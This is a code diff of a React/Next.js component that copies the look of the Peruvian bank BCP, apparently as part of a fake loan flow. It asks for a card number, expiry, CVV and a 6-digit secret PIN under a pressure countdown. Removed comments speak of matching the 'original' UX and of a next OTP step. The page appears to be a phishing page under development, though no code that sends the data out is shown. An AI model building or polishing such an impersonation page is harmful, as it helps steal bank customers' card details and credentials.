@@ -2,7 +2,6 @@
 "use client";
 
 import { useEffect, useState } from "react";
-// import { useRouter } from "next/navigation"; // si quieres navegar al siguiente paso
 
 export default function TarjetaClient({
   amount,
@@ -15,27 +14,21 @@ export default function TarjetaClient({
   docType: string;
   docNumber: string;
 }) {
-  // const router = useRouter();
-
-  // Header: contador 300s
   const [seconds, setSeconds] = useState(300);
   useEffect(() => {
     const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
     return () => clearInterval(t);
   }, []);
 
-  // Form state
-  const [card, setCard] = useState("");      // 16 dígitos (formateado 4-4-4-4)
-  const [exp, setExp] = useState("");        // MM/AA
-  const [cvv, setCvv] = useState("");        // 3 dígitos
+  const [card, setCard] = useState("");
+  const [exp, setExp] = useState("");
+  const [cvv, setCvv] = useState("");
   const [remember, setRemember] = useState(false);
-  const [clave, setClave] = useState("");    // 6 dígitos
+  const [clave, setClave] = useState("");
 
-  // Helpers de formato
-  const formatCard = (v: string) => {
-    const digits = v.replace(/\D/g, "").slice(0, 16);
-    return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-  };
+  const formatCard = (v: string) =>
+    v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+
   const formatExp = (v: string) => {
     const d = v.replace(/\D/g, "").slice(0, 4);
     if (d.length <= 2) return d;
@@ -44,24 +37,16 @@ export default function TarjetaClient({
 
   const onSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-
-    // Validaciones mínimas (igual UX del original)
     const cardDigits = card.replace(/\s/g, "");
     if (cardDigits.length < 16) return;
     if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return;
     if (!/^\d{3}$/.test(cvv)) return;
     if (!/^\d{6}$/.test(clave)) return;
-
-    // Navegar al siguiente paso si quieres:
-    // const qs = new URLSearchParams({ amount, payDay, docType, docNumber }).toString();
-    // router.push(`/prestamo/otp?${qs}`);
-
     alert("Continuará…");
   };
 
   return (
     <div className="min-h-screen bg-white">
-      {/* Header azul con logo y segundero, sin “Volver” */}
       <header className="bg-[color:var(--brand)] text-white">
         <div className="container-max h-12 flex items-center justify-between">
           <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
@@ -76,12 +61,11 @@ export default function TarjetaClient({
       </header>
 
       <main className="container-max py-6">
-        {/* Tarjeta principal */}
         <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow-[0_12px_28px_rgba(0,0,0,.08)] p-5 max-w-[380px]">
           <h1 className="text-2xl font-bold text-[color:var(--brand)]">Ingresa tus datos</h1>
 
           <form onSubmit={onSubmit} className="mt-5 space-y-5">
-            {/* Número de tarjeta con label chip */}
+            {/* Número de tarjeta */}
             <div className="field-bcp">
               <span className="field-bcp__label">Número de tarjeta</span>
               <input
@@ -104,24 +88,28 @@ export default function TarjetaClient({
               Recordar datos
             </label>
 
-            {/* Fecha de vencimiento + CVV (grupo unido) */}
-            <div className="group-bcp">
-              <div className="group-bcp__left">
+            {/* Fecha de vencimiento + CVV con el MISMO estilo “label chip” */}
+            <div className="grid grid-cols-2 gap-3">
+              <div className="field-bcp">
+                <span className="field-bcp__label">Fecha de vencimiento</span>
                 <input
-                  className="group-bcp__input"
+                  className="input-bcp w-full"
                   inputMode="numeric"
                   placeholder="MM/AA"
                   value={exp}
                   onChange={(e) => setExp(formatExp(e.target.value))}
                 />
               </div>
-              <div className="group-bcp__right">
+              <div className="field-bcp">
+                <span className="field-bcp__label">CVV</span>
                 <input
-                  className="group-bcp__input"
+                  className="input-bcp w-full"
                   inputMode="numeric"
                   placeholder="CVV"
                   value={cvv}
-                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+                  onChange={(e) =>
+                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
+                  }
                 />
               </div>
             </div>
@@ -133,9 +121,10 @@ export default function TarjetaClient({
                 className="input-bcp w-full"
                 inputMode="numeric"
                 type="password"
-                placeholder=""
                 value={clave}
-                onChange={(e) => setClave(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                onChange={(e) =>
+                  setClave(e.target.value.replace(/\D/g, "").slice(0, 6))
+                }
               />
             </div>
 
